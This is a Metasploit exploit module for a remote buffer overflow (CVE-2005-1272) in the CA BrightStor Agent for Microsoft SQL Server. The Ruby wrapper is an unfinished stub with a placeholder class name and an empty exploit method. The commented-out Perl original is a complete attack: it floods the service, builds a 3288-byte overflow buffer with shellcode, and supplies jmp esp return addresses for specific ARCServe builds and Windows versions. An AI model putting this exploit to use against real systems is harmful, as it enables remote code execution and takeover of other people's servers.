require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CA BrightStor Agent for Microsoft SQL Overflow',
			'Description'    => %q{
				This module exploits a vulnerability in the CA BrightStor
				Agent for Microsoft SQL Server. This vulnerability was
				discovered by cybertronic[at]gmx.net.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2005-1272'],
					[ 'BID', '14453'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=287&type=vulnerabilities'],
					[ 'URL', 'http://www3.ca.com/securityadvisor/vulninfo/vuln.aspx?id=33239'],
					[ 'MIL', '83'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, winnt, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Aug 02 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cabrightstor_sqlagent;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'CA BrightStor Agent for Microsoft SQL Overflow',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
	'Priv'     => 1,
	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 6070],
	  },

	'Payload' =>
	  {
		'Space'     => 1000,
		'BadChars'  => "\x00",
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys'		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the CA BrightStor
		Agent for Microsoft SQL Server. This vulnerability was discovered
		by cybertronic[at]gmx.net.
}),

	'Refs'    =>
	  [
		[ 'CVE', '2005-1272' ],
		[ 'BID', '14453' ],
		[ 'URL', 'http://www.idefense.com/application/poi/display?id=287&type=vulnerabilities' ],
		[ 'URL', 'http://www3.ca.com/securityadvisor/vulninfo/vuln.aspx?id=33239' ],
		[ 'MIL', '83'],		
	  ],

	'Targets' =>
	  [
		# This exploit requires a jmp esp for return
		['ARCServe 11.0 Asbrdcst.dll 12/12/2003',      0x20c11d64], # jmp esp
		['ARCServe 11.1 Asbrdcst.dll 07/21/2004',      0x20c0cd5b], # push esp, ret
		['ARCServe 11.1 SP1 Asbrdcst.dll 01/14/2005',  0x20c0cd1b], # push esp, ret
		
		# From minishare exploit
		['Windows 2000 SP0-SP3 English', 0x7754a3ab ], # jmp esp
		['Windows 2000 SP4 English',     0x7517f163 ], # jmp esp
		['Windows XP SP0-SP1 English',   0x71ab1d54 ], # push esp, ret
		['Windows XP SP2 English',       0x71ab9372 ], # push esp, ret
		['Windows 2003 SP0 English',     0x71c03c4d ], # push esp, ret
		['Windows 2003 SP1 English',     0x71c033a0 ], # push esp, ret
	  ],

	'Keys'    => ['brightstor'],

	'DisclosureDate' => 'Aug 02 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	# The 'one line' request does not work against Windows 2003
	for (my $i=0; $i <5; $i++)
	{
		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
		  );

		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		my $crap = ("\xff" x 0x12000);
		$s->Send($crap);
		$s->Recv(-1, 8);
		$s->Close();

		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
		  );

		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		# 3288 bytes max
		#  696 == good data (1228 bytes contiguous) @ 0293f5e0
		# 3168 == return address
		# 3172 == esp @ 0293ff8c (2476 from good data)

		my $poof = Pex::Text::EnglishText(3288);

		substr($poof,  696, length($shellcode), $shellcode);
		substr($poof, 3168, 4, pack('V', $target->[1])); # jmp esp
		substr($poof, 3172, 5, "\xe9\x4f\xf6\xff\xff");	 # jmp -2476

		$self->PrintLine("[*] Sending " .length($poof) . " bytes to remote host.");
		$s->Send($poof);

		$s->Recv(-1, 8);
		$self->Handler($s);
		$s->Close();
	}

	return;
}

1;

=end


end
end	
